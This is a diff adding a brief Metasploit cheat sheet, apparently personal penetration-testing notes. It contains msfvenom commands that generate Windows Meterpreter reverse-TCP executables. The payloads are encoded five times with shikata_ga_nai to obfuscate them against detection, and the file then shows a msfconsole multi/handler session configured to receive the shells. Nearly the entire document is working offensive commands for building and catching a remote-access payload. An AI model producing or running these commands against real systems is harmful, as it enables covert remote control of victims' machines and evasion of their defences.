@@ -1,0 +1,20 @@
+# ---
+# create payload example
+# reverce shell TCP
+msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -f exe  -i 5 LHOST=172.16.11.200 LPORT=4444 > payload_reverse_tcp_shikata_ga_nai_1.exe
+
+# port 443 ok
+
+# or obfuscation
+msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -b "\x00\x0a\x0d" EXITFUNC=thread  -f exe  -i 5 LHOST=172.16.11.200 LPORT=4444 > payload_reverse_tcp_shikata_ga_nai_2.exe
+
+msfconsole
+
+msf6 > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST 172.16.11.200
+LHOST => 172.16.11.200
+msf6 exploit(multi/handler) > set LPORT 4444
+msf6 exploit(multi/handler) > exploit
